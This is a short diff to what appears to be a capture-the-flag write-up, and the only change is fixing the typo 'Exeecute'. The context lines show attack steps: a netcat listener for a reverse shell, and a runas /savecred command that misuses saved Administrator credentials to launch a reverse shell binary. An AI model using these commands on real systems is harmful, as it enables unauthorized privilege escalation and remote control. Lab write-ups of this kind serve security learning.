@@ -186,7 +186,7 @@ We can now use `runas` to take the admins passwords and run a reverse shell payl
 `nc -lnvp 9009`
 
 
-+ Exeecute the payload as Administrator:
++ Execute the payload as Administrator:
 
 `runas /savecred /user:ACCESS\Administrator "C:\\Users\security\rshell.exe"`
 
